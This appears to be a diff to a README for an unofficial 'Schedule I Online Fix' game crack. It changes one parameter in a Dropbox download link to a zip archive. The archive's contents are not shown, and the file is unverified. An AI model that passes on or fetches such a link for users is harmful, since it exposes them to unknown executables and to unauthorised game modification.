@@ -25,7 +25,7 @@ You're now ready to play multiplayer — host or join sessions freely.
 
 ---
 
-[![Download Schedule I Online Fix](https://img.shields.io/badge/Download-Schedule%20I%20Online%20Fix-blueviolet)](https://www.dropbox.com/scl/fi/6xlfrl2cmxcxtbq85lx7z/Schedule-I-Online-Fix.zip?rlkey=4w11pf8uso1kdlqh8mtwcptjw&st=7bclfaw6&dl=1)
+[![Download Schedule I Online Fix](https://img.shields.io/badge/Download-Schedule%20I%20Online%20Fix-blueviolet)](https://www.dropbox.com/scl/fi/6xlfrl2cmxcxtbq85lx7z/Schedule-I-Online-Fix.zip?rlkey=4w11pf8uso1kdlqh8mtwcptjw&st=eioo9c1g&dl=1)
 
 ---
 
